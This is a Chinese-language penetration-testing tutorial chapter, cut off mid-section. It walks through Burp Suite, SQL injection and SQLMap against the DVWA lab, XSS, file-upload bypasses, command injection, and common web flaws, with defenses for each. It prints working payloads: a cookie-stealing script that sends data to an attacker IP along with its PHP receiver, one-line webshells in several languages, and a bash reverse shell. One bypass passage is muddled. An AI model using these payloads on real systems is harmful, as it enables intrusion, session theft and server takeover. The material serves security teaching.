# 第三章 Web渗透测试——从入门到上手实战

> 第3章 | 预计学习时间：6小时 | 难度：⭐⭐⭐

---

## 📖 写在前面

前两章我们学了Kali基础和信息收集，这一章我们进入**重头戏**——Web渗透测试。

为什么Web渗透这么重要？

```
因为现在大部分应用都是Web应用：
  ✓ 网站
  ✓ 后台管理系统
  ✓ 微信小程序
  ✓ 手机APP的后端接口
  ✓ ......

Web应用数量多、更新快、漏洞也多，
是渗透测试的主战场。
```

这一章我们会一个漏洞一个漏洞地讲，
**每个漏洞都讲清楚：是什么 → 为什么会有 → 怎么利用 → 怎么防御**，
保证你看完就能上手在DVWA里练手。

---

## 3.1 Burp Suite——Web渗透必备神器

在讲漏洞之前，我们得先学会用一个工具——**Burp Suite**。

它是Web渗透测试的标配，几乎人手一个。

### 3.1.1 Burp Suite是啥？

用大白话讲：

```
Burp Suite = 抓包工具 + 改包工具 + 扫描器 + ......一堆功能

它就像你和网站之间的一个"中间人"：
  你的浏览器 ←→ Burp ←→ 网站服务器

所有请求和响应都经过Burp，
你可以：
  ✓ 看请求里有啥
  ✓ 改请求内容再发出去
  ✓ 重放请求（同一个请求发N次）
  ✓ 自动跑漏洞扫描
  ✓ 暴力破解
  ✓ ......
```

### 3.1.2 Burp Suite的版本

```
三个版本：
  Community（社区版）  → 免费，功能少点，练习够用
  Professional（专业版） → 要钱，功能全，干活用
  Enterprise（企业版）   → 更贵，企业批量扫描用

Kali里预装的是社区版，
新手练习用社区版完全够了。
```

### 3.1.3 启动Burp并配置代理

#### 第一步：启动Burp

```bash
# 终端输入
kali@kali:~$ burpsuite

# 或者在菜单里找：
# Applications → 03 - Web Application Analysis → burpsuite
```

启动后：
- 选 **Temporary project** （临时项目）
- 点 **Next**
- 选 **Use Burp defaults** （用默认配置）
- 点 **Start Burp**

#### 第二步：配置浏览器代理

Burp默认监听在 `127.0.0.1:8080`，
我们需要让浏览器的流量走Burp。

```
方法1：用FoxyProxy插件（推荐）
  1. Firefox扩展商店搜 FoxyProxy
  2. 安装这个插件
  3. 点插件图标 → Options
  4. Add新代理：
     Proxy Type: HTTP
     Proxy IP: 127.0.0.1
     Port: 8080
  5. 保存，然后启用这个代理

方法2：浏览器直接设置
  Firefox设置 → 网络设置 → 手动代理配置
  HTTP代理：127.0.0.1  端口：8080
  勾上"也对HTTPS使用此代理"
```

#### 第三步：安装HTTPS证书

不装证书的话，HTTPS网站会报错。

```
1. 确保浏览器代理已经设好了
2. 浏览器访问 http://burp
3. 点右上角的 CA Certificate 下载证书
4. Firefox设置 → 隐私与安全 → 查看证书
5. 导入 → 选刚才下载的cacert.der
6. 勾上"信任该CA来标识网站"
7. 确定
```

#### 第四步：测试一下

```
1. Burp切到 Proxy 选项卡
2. 确保 Intercept is on （拦截开着）
3. 浏览器随便访问一个网站
4. 看Burp里是不是抓到请求了
5. 点 Forward 放包，Forward是放行
   Drop是丢掉，不发出去
```

> 🎉 恭喜！你已经会用Burp抓包了！
> 这是Web渗透的第一步，也是最重要的一步。

### 3.1.4 Burp主要功能介绍

Burp有很多模块，我们先介绍最常用的几个：

| 模块 | 干啥的 | 常用程度 |
|------|--------|----------|
| **Proxy** | 抓包、改包、拦截 | ⭐⭐⭐⭐⭐ |
| **Repeater** | 重放请求，手动测试 | ⭐⭐⭐⭐⭐ |
| **Intruder** | 暴力破解、Fuzz | ⭐⭐⭐⭐ |
| **Scanner** | 自动扫描漏洞 | ⭐⭐⭐⭐（社区版没有） |
| **Decoder** | 编码解码 | ⭐⭐⭐ |
| **Comparer** | 对比两个响应 | ⭐⭐⭐ |
| **Sequencer** | 测试随机性 | ⭐⭐ |
| **Extender** | 插件商店 | ⭐⭐⭐⭐ |

#### Proxy——抓包改包

```
Intercept选项卡：
  拦截请求，可以改了再发
  Forward → 放行
  Drop → 丢掉
  Action → 发送到其他模块（比如Repeater）

HTTP history选项卡：
  所有经过Burp的请求都在这
  可以翻历史记录
  选中某个请求 → Ctrl+R 发送到Repeater
```

#### Repeater——手动测试神器

```
Repeater是我最喜欢的模块，
手动测试的时候基本都在这玩。

用法：
1. 从Proxy或History里把请求发过来（Ctrl+R）
2. 在左边改请求内容
3. 点 Send 发出去
4. 右边看响应
5. 继续改，继续发...
```

> 💡 **小技巧**：Repeater里可以开很多标签页，
> 同时测好几个点，不用来回切。

#### Intruder——暴力破解/Fuzz

```
Intruder用来做自动化测试：
  ✓ 暴力破解密码
  ✓ 枚举用户名
  ✓ Fuzz测试（测各种输入点）
  ✓ 批量跑POC

四个攻击模式：
  Sniper      → 一个字典，每个位置轮流跑
  Battering ram → 一个字典，所有位置同时跑
  Pitchfork   → 每个位置一个字典，一一对应
  Cluster bomb → 每个位置一个字典，笛卡尔积
```

后面我们讲暴力破解的时候会详细演示Intruder的用法。

### 3.1.5 Burp使用小技巧

```
技巧1：常用快捷键
  Ctrl+R    → 发送到Repeater
  Ctrl+I    → 发送到Intruder
  Ctrl+U    → URL编码
  Ctrl+Shift+U → URL解码
  Ctrl+B    →  Base64编码
  Ctrl+Shift+B → Base64解码
  Ctrl+L    → 转到URL位置

技巧2：设置仅拦截请求
  Proxy → Options → Intercept Server Responses
  把这个关掉，就只拦请求不拦响应了
  （响应太多很烦的）

技巧3：设置范围（Scope）
  Target → Site map → 找到目标域名
  → 右键 → Add to scope
  然后Proxy历史里可以选"Show only in-scope items"
  只看目标网站的请求，清爽多了

技巧4：插件扩展
  Extender → BApp Store
  里面有很多好用的插件，推荐几个：
  ✓ HackBar → 手动测试用
  ✓ WafW00f → 检测WAF
  ✓ SQLiPy → SQL注入扫描
  ✓ Autorize → 越权测试
```

---

## 3.2 SQL注入——Web漏洞之王

SQL注入可以说是最经典、危害最大的Web漏洞之一了。
每个学Web安全的人，第一个学的应该就是SQL注入。

### 3.2.1 SQL注入是啥？

用大白话讲：

```
网站要和数据库交互，就得写SQL语句。
如果程序员偷懒，直接把用户输入拼到SQL语句里，
那用户就可以输入一些特殊字符，
改变SQL语句的原意，
让数据库执行我们想要的操作。

这就是SQL注入。
```

举个最简单的例子：

```
登录功能的SQL语句大概长这样：
SELECT * FROM users WHERE username='用户名' AND password='密码'

正常登录：
  用户名：admin
  密码：123456
  SQL变成：
  SELECT * FROM users WHERE username='admin' AND password='123456'
  → 正常

如果用户名输入：admin' --
  SQL变成：
  SELECT * FROM users WHERE username='admin' -- ' AND password='...'
  注意：-- 在SQL里是注释的意思！
  后面的密码条件被注释掉了！
  → 只要用户名对，不用密码也能登录！
```

这就是最经典的**万能密码**。

### 3.2.2 怎么判断有没有SQL注入

看到URL里有参数的地方，比如：
```
http://xxx.com/news.php?id=1
http://xxx.com/page.php?cat=5
http://xxx.com/search.php?q=test
```

就可以试试有没有注入。

#### 第一步：加个单引号

```
在参数值后面加个单引号 '
比如：http://xxx.com/news.php?id=1'

如果：
  → 页面报错了（SQL语法错误）
  → 页面内容变了（和id=1不一样）
  → 页面空白了
  
那就很可能有注入！
```

为什么加单引号会报错？

```
原来的SQL：
SELECT * FROM news WHERE id = 1

加了单引号后：
SELECT * FROM news WHERE id = 1'
                                    ↑
                               多了个单引号
SQL语法错误，数据库就报错了。
```

#### 第二步：用 and 1=1 和 and 1=2 测试

```
http://xxx.com/news.php?id=1 and 1=1
  → 页面正常显示（因为1=1是永真的）

http://xxx.com/news.php?id=1 and 1=2
  → 页面异常/空白/报错（因为1=2是假的）

如果两个页面显示不一样，
那就99%是有注入了！
```

> 💡 **原理**：
> and 1=1 条件成立，SQL正常执行，页面正常
> and 1=2 条件不成立，SQL查不到数据，页面异常
> 这说明我们输入的SQL语句被执行了！

### 3.2.3 SQL注入分类

```
SQL注入分类：

┌──────────────────────────────┐
│ 按注入点类型分：              │
│  • 数字型注入（id=1）        │
│  • 字符型注入（name='xxx'）  │
│  • 搜索型注入                │
└──────────────────────────────┘

┌──────────────────────────────┐
│ 按返回结果分：                │
│  • 联合查询注入（有回显）    │
│  • 报错注入（有错误信息）    │
│  • 盲注（没有明显回显）      │
│    - 布尔盲注（真/假）       │
│    - 时间盲注（看延迟）      │
└──────────────────────────────┘
```

我们先从最简单的**联合查询注入**讲起。

### 3.2.4 联合查询注入一步步来

拿DVWA来练手，难度选Low。

进入SQL Injection页面，输入1，点Submit。
我们看到返回了用户ID、First name、Surname。

#### 第一步：判断注入点和类型

```
输入：1'
结果：报错了！"You have an error in your SQL syntax..."

→ 有注入，而且是字符型注入
```

#### 第二步：判断有几列（字段数）

用 `order by` 来猜：

```
输入：1' order by 1 -- 
→ 正常

输入：1' order by 2 -- 
→ 正常

输入：1' order by 3 -- 
→ 报错：Unknown column '3' in 'order clause'

→ 说明有2列（字段数是2）
```

> 💡 **原理**：
> order by 数字 是按第几列排序，
> 如果数字超过总列数，就会报错。

#### 第三步：判断显示位（哪一列会显示在页面上）

用 `union select`：

```
输入：1' union select 1,2 -- 

结果：
ID: 1' union select 1,2 -- 
First name: 1
Surname: 2
```

你看，1和2都显示出来了，说明两列都会显示。
第一列是First name，第二列是Surname。

> ⚠️ **注意**：如果前面的1有数据，
> 可能看不到union select的结果，
> 把1改成一个不存在的id，比如-1
> 输入：-1' union select 1,2 --

#### 第四步：查数据库名

用 `database()` 函数：

```
输入：-1' union select database(), version() -- 

结果：
First name: dvwa         ← 数据库名是 dvwa
Surname: 10.3.29-MariaDB ← 数据库版本
```

太棒了！我们拿到数据库名了。

#### 第五步：查表名

从 `information_schema.tables` 里查：

```
MySQL里有个系统库叫 information_schema，
里面存了所有的库名、表名、列名。

查所有表名：
-1' union select 1, table_name from information_schema.tables where table_schema=database() -- 

但这样可能只显示第一个表，
因为页面只显示一行。
那我们用 group_concat 把所有表名拼起来：

-1' union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() -- 

结果：
Surname: guestbook,users
```

看到了吗？有两个表：
- **guestbook**（留言板）
- **users**（用户表，重点！）

#### 第六步：查列名（字段名）

从 `information_schema.columns` 里查：

```
查users表里有哪些字段：

-1' union select 1, group_concat(column_name) from information_schema.columns where table_name='users' -- 

结果：
Surname: user_id,first_name,last_name,user,password,avatar,last_login,user,failed_login
```

哇，字段都出来了！
重点关注这两个：
- **user**（用户名）
- **password**（密码）

#### 第七步：拖库（查数据）

终于到最后一步了，把数据都查出来！

```
查所有用户名和密码：

-1' union select user, password from users -- 

但这样可能只显示第一个，
用 group_concat 或者 limit 一个一个看：

方法1：group_concat拼起来
-1' union select 1, group_concat(user,0x3a,password) from users -- 
（0x3a是冒号的十六进制，用来分隔用户名和密码）

方法2：limit一个一个看
-1' union select user, password from users limit 0,1 -- 
-1' union select user, password from users limit 1,1 -- 
-1' union select user, password from users limit 2,1 -- 
......
```

结果你会看到几个用户：
- admin / 5f4dcc3b5aa765d61d8327deb882cf99
- gordonb / e99a18c428cb38d5f260853678922e03
- 1337 / 8bd328e1aac73dfb17ed00a13783c59b
- pablo / 0d107d09f5bbe40cade3de5c71e9e9b7
- smithy / 5f4dcc3b5aa765d61d8327deb882cf99

密码是MD5加密的，我们可以去MD5解密网站解密：
- 5f4dcc3b5aa765d61d8327deb882cf99 → **password**
- e99a18c428cb38d5f260853678922e03 → **abc123**
- ...

🎉 恭喜！你完成了第一次SQL注入！

### 3.2.5 报错注入

如果页面不显示数据，但是会显示SQL错误信息，
那就可以用**报错注入**，让数据通过错误信息显示出来。

常用的报错函数：
- `updatexml()`
- `extractvalue()`
- `floor()`

#### 用updatexml报错

```
语法：
and updatexml(1, concat(0x7e, 你要查的东西, 0x7e), 1)

0x7e 是 ~ 符号的十六进制，
用来把数据包裹起来，方便看。
```

例子：

```
查数据库名：
1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) -- 

结果报错：
XPATH syntax error: '~dvwa~'
                ↑
          数据库名出来了！

查表名：
1' and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1), 0x7e), 1) -- 

查列名：
1' and updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 0,1), 0x7e), 1) -- 

查数据：
1' and updatexml(1, concat(0x7e, (select password from users limit 0,1), 0x7e), 1) -- 
```

> ⚠️ **注意**：updatexml最多显示32个字符，
> 数据长的话要用substring截断，或者用其他方法。

### 3.2.6 盲注

如果页面既不显示数据，也不显示错误信息，
那就是盲注了。

盲注分两种：
- **布尔盲注**：页面只有"正常"和"异常"两种状态
- **时间盲注**：通过sleep()函数看页面响应时间

#### 布尔盲注

```
原理：
  构造SQL语句，通过页面返回是否正常来判断对错，
  一个字符一个字符地猜。

比如判断数据库名第一个字符：
  如果第一个字符是 'a'，页面正常
  如果不是，页面异常

怎么猜？用ASCII码：
  ascii(substr(database(), 1, 1)) > 97
  → 大于'a'的ASCII码？

然后用二分法一个个猜出来。
```

布尔盲注的例子：

```
判断数据库名长度：
1' and length(database())=4 -- 
→ 页面正常，说明长度是4

猜第一个字符：
1' and ascii(substr(database(),1,1))=100 -- 
→ 100是'd'，如果页面正常，第一个字符就是d

猜第二个字符：
1' and ascii(substr(database(),2,1))=118 -- 
→ 118是'v'

......
这样一个一个猜，最后猜出完整的数据库名
```

布尔盲注手动猜太费劲了，一般用工具或者写脚本。

#### 时间盲注

如果页面连真假都不显示（不管对不对页面都一样），
那就用时间盲注，通过 `sleep()` 看延迟。

```
原理：
  如果条件成立，就sleep几秒
  我们看页面响应时间有没有变长，来判断对错

语法：
if(条件, sleep(秒数), 0)
```

例子：

```
判断数据库名第一个字符是不是'd'：
1' and if(ascii(substr(database(),1,1))=100, sleep(5), 0) -- 

如果页面等了5秒才返回 → 条件成立，第一个字符是'd'
如果页面立刻返回 → 条件不成立，再猜下一个
```

时间盲注更慢，但更隐蔽。

### 3.2.7 SQLMap——自动注入神器

手动注入太麻烦？
交给SQLMap！它能自动帮你测注入、拖库。

#### 基本用法

```bash
# 最简单的用法：测某个URL有没有注入
kali@kali:~$ sqlmap -u "http://目标/news.php?id=1"

# 如果是POST请求，把POST数据带上
kali@kali:~$ sqlmap -u "http://目标/login.php" --data "username=admin&password=123"

# 如果需要Cookie（比如要登录的页面）
kali@kali:~$ sqlmap -u "http://目标/page.php?id=1" --cookie="PHPSESSID=xxx; security=low"
```

SQLMap检测出有注入后，会问你各种问题，
新手直接一路回车用默认选项就行。

#### 常用参数

```bash
# 列出所有数据库
--dbs

# 指定数据库
-D 数据库名

# 列出某个库的所有表
--tables
-D 数据库名 --tables

# 列出某个表的所有列
--columns
-D 数据库名 -T 表名 --columns

# 拖库（把数据都导出来）
--dump
-D 数据库名 -T 表名 --dump

# 只拖某几列
-C 列名1,列名2 --dump

# 获取当前数据库
--current-db

# 获取当前用户
--current-user

# 看看是不是DBA（管理员）
--is-dba

# 执行系统命令（有权限的话）
--os-shell
```

#### 实战：用SQLMap打DVWA

```bash
# 第一步：先抓个请求，把Cookie拿到
# 在DVWA的SQL Injection页面搜一下1，
# 用Burp抓包，把Cookie复制出来

# 第二步：跑SQLMap
kali@kali:~$ sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=abc123; security=low" \
  --dbs

# 等它跑完，会显示有哪些数据库
# 应该能看到 dvwa 数据库

# 第三步：查表
kali@kali:~$ sqlmap -u "..." --cookie="..." \
  -D dvwa --tables

# 第四步：查users表的列
kali@kali:~$ sqlmap -u "..." --cookie="..." \
  -D dvwa -T users --columns

# 第五步：拖库
kali@kali:~$ sqlmap -u "..." --cookie="..." \
  -D dvwa -T users --dump
```

> ⚠️ **注意**：用SQLMap的时候别用太快的速度，
> 容易把目标打死，也容易被发现。
> 可以用 `--delay=1` 设置每次请求间隔1秒。

### 3.2.8 SQL注入怎么防御

说了这么多攻击方法，也得讲讲怎么防。

```
防御SQL注入的三大法宝：

1. 预编译（Prepared Statements）
   不要把用户输入直接拼到SQL里
   用参数化查询，比如PHP的PDO
   
   错误写法：
   $sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
   
   正确写法：
   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
   $stmt->execute([$_GET['id']]);

2. 输入过滤/验证
   数字类型就转成int
   字符串类型就过滤特殊字符
   或者用白名单

3. 最小权限原则
   数据库账号不要用root
   用普通账号，只给必要的权限
   就算被注入了，危害也小一些
```

---

## 3.3 XSS跨站脚本攻击

XSS也是Web安全里的常客，和SQL注入齐名。

### 3.3.1 XSS是啥？

```
XSS（Cross Site Scripting）跨站脚本攻击

原理：
  攻击者在页面里注入恶意JavaScript代码
  其他用户访问这个页面时
  恶意代码就在他们的浏览器里执行了

能干嘛：
  ✓ 偷Cookie（盗取用户会话，直接登录别人账号）
  ✓ 钓鱼（弹出假的登录框骗密码）
  ✓ 挂马（下载木马）
  ✓ 挖矿（偷偷用用户CPU挖虚拟币）
  ✓ 劫持浏览器
  ✓ ......
```

### 3.3.2 XSS的三种类型

```
┌──────────────────────────────────┐
│  反射型XSS（Reflected）           │
│  一次性的，参数里的脚本直接返回    │
│  需要诱导用户点击恶意链接          │
│  危害：中                        │
└──────────────────────────────────┘

┌──────────────────────────────────┐
│  存储型XSS（Stored）              │
│  恶意脚本存到数据库里了           │
│  每个访问的用户都会中招           │
│  危害：大                        │
└──────────────────────────────────┘

┌──────────────────────────────────┐
│  DOM型XSS                         │
│  纯前端的问题，和后端没关系       │
│  JS直接取URL参数输出到页面        │
│  危害：中                        │
└──────────────────────────────────┘
```

### 3.3.3 反射型XSS实战

拿DVWA的XSS (Reflected)来练手，难度Low。

页面上有个输入框，让你输入名字，然后显示"Hello xxx"。

#### 第一步：测试

```
先随便输个名字，比如 test
结果：Hello test

看看URL变成啥了：
http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=test
```

#### 第二步：试试最基本的

```
输入：<script>alert(1)</script>

然后点Submit...

什么？弹窗了！
→ 说明有XSS！
```

> 💡 弹窗（alert）是XSS最经典的测试方法，
> 一弹窗就说明有漏洞。

#### 第三步：偷Cookie演示

光弹个窗没啥意思，我们来试试偷Cookie。

```
先看看当前页面的Cookie是什么：
在浏览器按 F12 → Console → 输入 document.cookie
你会看到类似这样的：
"PHPSESSID=abc123; security=low"
```

构造一个偷Cookie的链接：

```
http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<script>document.location='http://攻击者的IP/cookie.php?c='+document.cookie</script>

用户点了这个链接，
Cookie就会被发送到攻击者的服务器上。
```

攻击者那边只要写个简单的PHP文件接收：

```php
<?php
// cookie.php
$cookie = $_GET['c'];
file_put_contents('cookies.txt', $cookie . "\n", FILE_APPEND);
?>
```

然后攻击者拿到Cookie，就能冒充用户登录了。

> ⚠️ **这就是为什么XSS很危险的原因，
> 偷到Cookie就能直接登录别人的账号。**

### 3.3.4 存储型XSS实战

存储型XSS更危险，因为它是持久化的。

拿DVWA的XSS (Stored)来练手。
这是个留言板，你发的留言会存到数据库里，
每个人访问都能看到。

#### 第一步：测试

```
在Name框随便输个名字
在Message框输入：<script>alert(1)</script>

点Sign Guestbook提交

然后刷新一下页面...
biu~ 弹窗了！

而且不管谁访问这个页面都会弹，
因为恶意代码已经存到数据库里了！
```

存储型XSS比反射型危害大得多，
不需要诱导用户点链接，
只要用户访问页面就中招。

### 3.3.5 XSS的各种绕过姿势

如果对方过滤了 `<script>` 标签怎么办？
别慌，XSS的姿势多着呢。

```
姿势1：大小写绕过
  <Script>alert(1)</script>
  <SCRIPT>alert(1)</SCRIPT>

姿势2：双写绕过（过滤一次的话）
  <scrscriptipt>alert(1)</scrscriptipt>

姿势3：不用script标签
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  <body onload=alert(1)>
  <input onfocus=alert(1) autofocus>

姿势4：用伪协议
  <iframe src=javascript:alert(1)></iframe>
  <a href=javascript:alert(1)>点我</a>

姿势5：编码绕过
  Unicode编码、HTML实体编码...

姿势6：事件触发
  onerror, onload, onclick, onmouseover...
  各种事件，多得很
```

> 📚 **XSS的Payload太多了**，
> 可以去 XSS Filter Evasion Cheat Sheet 看看，
> 里面有各种绕过姿势。

### 3.3.6 XSS怎么防御

```
防御XSS的核心：对输入做过滤，对输出做编码

1. 输入过滤
   白名单：只允许输入合法的字符
   黑名单：过滤 < > ' " script javascript 等
   （黑名单容易被绕过，白名单更可靠）

2. 输出编码
   输出到HTML的时候，把特殊字符转成HTML实体：
   < → &lt;
   > → &gt;
   ' → &#39;
   " → &quot;
   & → &amp;
   
   这样浏览器就不会把它们当HTML标签解析了

3. HttpOnly Cookie
   给Cookie设置HttpOnly属性
   这样JS就读不到Cookie了
   就算有XSS也偷不到Cookie
   （但XSS的其他危害还在）

4. CSP（内容安全策略）
   设置CSP响应头
   限制哪些来源的脚本可以执行
   就算注入了脚本也执行不了
```

---

## 3.4 文件上传漏洞

文件上传漏洞也是很常见的，危害也很大，
直接上传个WebShell就能控制服务器了。

### 3.4.1 什么是文件上传漏洞

```
很多网站都有上传功能：
  ✓ 头像上传
  ✓ 图片上传
  ✓ 附件上传
  ✓ ......

如果网站没做好校验，
攻击者就能上传恶意文件（比如一句话木马），
然后访问这个文件执行代码，
最终控制整个服务器。
```

### 3.4.2 一句话木马

一句话木马是最常用的WebShell，
就一行代码，但功能强大。

#### PHP一句话

```php
<?php @eval($_POST['cmd']); ?>
```

就这一行，解释一下：
- `@` 表示出错不显示（隐藏自己）
- `eval()` 把字符串当PHP代码执行
- `$_POST['cmd']` 从POST参数里取cmd的值

怎么用？
```
传上去之后，用菜刀、蚁剑连接，
或者直接POST请求：
cmd=phpinfo();
cmd=system('whoami');
cmd=system('ls /');
```

#### 其他语言的一句话

```
ASP：
<%eval request("cmd")%>

ASPX：
<%@ Page Language="Jscript"%>
<%eval(Request.Item["cmd"],"unsafe");%>

JSP：
<%
if(request.getParameter("cmd")!=null){
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    ...
}
%>
```

### 3.4.3 常见的上传校验和绕过

#### 1. 前端JS校验（最容易绕过）

有些网站只在前端用JS检查文件后缀，
这种最好绕了。

```
绕过方法：
  方法1：浏览器禁用JS
  方法2：Burp抓包改后缀
         先改成合法的文件名上传，
         抓包后再改成.php
  方法3：改前端JS代码
```

#### 2. 黑名单校验

黑名单就是：".php .asp .jsp 这些后缀不允许上传"

```
绕过姿势：

1. 大小写绕过
   shell.pHp
   shell.PHP
   shell.PhP
   （Windows不区分大小写）

2. 特殊后缀绕过
   shell.php3
   shell.php4
   shell.php5
   shell.phtml
   （有些配置下这些也会被当PHP解析）

3. .htaccess文件
   先上传一个.htaccess文件，
   内容：AddType application/x-httpd-php .jpg
   然后传shell.jpg，就会被当PHP执行

4. 双写绕过
   shell.php.jpg
   （有些程序只过滤一次，把.php去掉后，
    前后拼起来又成.php了？不对，这个是文件名...
    双写后缀一般是针对过滤的，比如 pp hph p → 去掉中间的php成了pp）
    不对，双写是比如：
    程序会把 .php 替换成空
    那你传 .pphphp → 去掉中间的php → 变成 .php

5. 点和空格绕过（Windows特性）
   shell.php.
   shell.php (后面加空格)
   Windows会自动去掉末尾的点和空格
   但程序校验的时候可能没去掉

6. ::$DATA绕过（Windows NTFS特性）
   shell.php::$DATA
   Windows会把它当成正常的php文件
```

#### 3. 白名单校验

白名单就是："只允许上传 .jpg .png .gif"

白名单比黑名单安全，但也不是绝对的。

```
绕过姿势：

1. %00截断（PHP < 5.3.4）
   利用00字节截断
   文件名：shell.php%00.jpg
   程序校验后缀是.jpg（看后面）
   但保存的时候遇到%00就截断了
   实际保存成shell.php

2. 路径截断
   上传路径是 /upload/xxx.php/
   有些情况下也能截断

3. 解析漏洞
   Apache解析漏洞：
     shell.php.jpg
     Apache从后往前找后缀，
     .jpg不认识，再往前看，.php认识
     就按PHP执行了
   
   Nginx解析漏洞：
     /upload/shell.jpg/shell.php
     有些版本会把前面的当PHP执行

4. 图片马
   把一句话和图片合在一起：
   copy 正常.jpg/b + 一句话.php/a 木马.jpg
   
   这样文件头是图片，能通过图片检测，
   但如果有解析漏洞就能执行。
   或者配合文件包含漏洞来用。
```

#### 4. 文件内容校验

有些网站会检查文件内容，比如检查是不是真的图片。

```
绕过方法：

1. 文件头绕过
   在一句话前面加上图片文件头：
   
   GIF89a
   <?php @eval($_POST['cmd']); ?>
   
   （GIF的文件头是GIF89a）
   
   或者：
   0xFFD8FF 开头的是JPG

2. 图片马
   真的图片和一句话合并，
   从文件内容看就是一张正常的图片
```

### 3.4.4 文件上传漏洞的防御

```
1. 文件后缀校验用白名单
   只允许指定的后缀，比如 .jpg .png .gif
   不要用黑名单

2. 文件名随机化
   上传后文件改个随机名字，
   比如 md5(时间戳+随机数).jpg
   这样攻击者就算上传了也不知道文件名

3. 文件内容校验
   检查文件头、文件尺寸
   图片的话可以用GD库重新生成一下
   （二次渲染）

4. 文件存放目录分开
   上传的文件不要放在Web可访问目录下
   或者放在独立域名下

5. 禁止脚本执行
   上传目录设置为不可执行
   比如Nginx里配置：
   location /upload/ {
       php_flag engine off;
   }

6. 权限控制
   上传目录设置为只读，没有执行权限
```

---

## 3.5 命令注入

### 3.5.1 什么是命令注入

```
网站有些功能需要执行系统命令，
比如ping功能、traceroute功能。

如果程序员直接把用户输入拼到命令里，
攻击者就可以注入额外的命令，
让服务器执行任意系统命令。
```

举个例子：

```
网站有个ping功能：
  用户输入IP，后台执行 ping IP

正常输入：127.0.0.1
后台执行：ping 127.0.0.1

如果用户输入：127.0.0.1; whoami
后台执行：ping 127.0.0.1; whoami
→ 先ping，然后执行whoami！
```

### 3.5.2 命令连接符

Linux下常用的命令连接符：

| 符号 | 作用 | 例子 |
|------|------|------|
| `;` | 前面执行完执行后面 | `a;b` → a执行完执行b |
| `&&` | 前面成功才执行后面 | `a&&b` → a成功才执行b |
| `||` | 前面失败才执行后面 | `a||b` → a失败才执行b |
| `&` | 后台执行 | `a&b` → a后台，b前台 |
| `|` | 管道符，前面的输出当后面的输入 | `a\|b` |
| `` ` `` | 反引号，先执行里面的 | \`whoami\` |
| `$()` | 和反引号类似 | `$(whoami)` |

### 3.5.3 实战：DVWA命令注入

进入DVWA的Command Injection页面，难度Low。

```
让你输入一个IP地址，执行ping。

输入：127.0.0.1
结果：PING的结果，正常。

试试注入：
输入：127.0.0.1; whoami

结果：
PING 127.0.0.1 ...
... （ping的结果）
www-data   ← 执行了whoami！
```

再来几个：

```
127.0.0.1; ls               ← 看当前目录有啥
127.0.0.1; cat /etc/passwd ← 看用户列表
127.0.0.1; id               ← 看当前用户id
127.0.0.1; pwd              ← 看当前路径
```

还可以反弹Shell（把对方的命令行弹到我们这来）：

```bash
# 我们这边先监听
kali@kali:~$ nc -lvp 4444

# 注入点执行
127.0.0.1; bash -i >& /dev/tcp/我们的IP/4444 0>&1

然后我们这边就拿到对方的Shell了！
```

### 3.5.4 命令注入的防御

```
1. 尽量不要执行系统命令
   能不用system/exec就不用
   用PHP/Python自带的函数实现

2. 如果必须要用，用白名单
   只允许执行指定的几个命令
   或者只允许输入特定格式（比如IP地址）

3. 对输入做严格过滤
   过滤 ; & | ` $ ( ) 等特殊字符

4. 用escapeshellarg/escapeshellcmd
   PHP里有专门的函数转义shell命令参数
```

---

## 3.6 其他常见Web漏洞简介

前面几个是重点，我们详细讲了。
这几个也很常见，简单了解一下。

### 3.6.1 CSRF跨站请求伪造

```
什么是CSRF？
  攻击者诱导用户访问恶意网站，
  恶意网站里自动发请求到目标网站，
  因为用户已经登录了目标网站，
  浏览器会自动带上Cookie，
  目标网站以为是用户自己操作的，
  就执行了。

能干嘛？
  ✓ 改密码
  ✓ 转账
  ✓ 发帖子
  ✓ ......（用户能做啥就能干啥）

防御：
  1. Token验证（每个请求带个随机Token）
  2. 验证Referer
  3. 关键操作二次验证（短信、密码）
  4. SameSite Cookie
```

### 3.6.2 SSRF服务端请求伪造

```
什么是SSRF？
  服务器端有个功能会去请求某个URL，
  攻击者可以控制这个URL，
  让服务器去请求内网的资源。

能干嘛？
  ✓ 探测内网（扫内网端口、主机）
  ✓ 攻击内网服务
  ✓ 读取本地文件（file://协议）
  ✓ 打云服务的元数据接口

防御：
  1. 禁止访问内网IP
  2. 协议白名单（只允许http/https）
  3. 端口白名单
  4. 统一错误信息（不要透露端口是否开放）
```

### 3.6.3 XXE XML外部实体注入

```
什么是XXE？
  网站解析用户提交的XML，
  如果启用了外部实体，
  攻击者可以构造恶意XML
  读取服务器文件、SSRF等。

能干嘛？
  ✓ 读文件（/etc/passwd等）
  ✓ SSRF
  ✓ DoS（亿笑攻击）

防御：
  1. 禁用外部实体
  2. 禁用DTD
  3. 用JSON不用XML
```

### 3.6.4 文件包含漏洞

```
什么是文件包含？
  PHP里有 include() require() 函数，
  如果包含的文件路径用户可控，
  攻击者可以包含任意文件，
  甚至远程文件。

分类：
  • 本地文件包含（LFI）→ 包含服务器本地文件
  • 远程文件包含（RFI）→ 包含远程URL的文件（需要开allow_url_include）

能干嘛？
  ✓ 读敏感文件
  ✓ 执行任意代码（配合上传或日志文件）

防御：
  1. 尽量不要让用户控制包含的路径
  2. 用白名单
  3. 关闭allow_url_include
  4. open_basedir限制目录
```

### 3.6.5 逻辑漏洞

```
逻辑漏洞是最防不胜防的，
因为不是代码层面的问题，
而是业务逻辑设计有问题。

常见的逻辑漏洞：
  • 验证码绕过（可以无限试）
  • 密码找回漏洞（篡改用户ID）
  • 越权访问（水平/垂直越权）
  • 支付漏洞（改价格、改数量）
  • 并发问题（条件竞争）
  • ......

防御：
  每个关键操作都要校验权限，
  关键数据不能信客户端，
  服务端要重新计算、重新校验。
```

---

## 3.7 WebShell管理工具

拿到WebShell之后，用什么工具管理呢？

### 3.7.1 中国菜刀（经典但老了）

```
老牌WebShell管理工具，
曾经人手一个。
但现在已经不更新了，
而且容易被杀软检测。
```

### 3.7.2 蚁剑（AntSword）—— 推荐！

```
国产的WebShell管理工具，
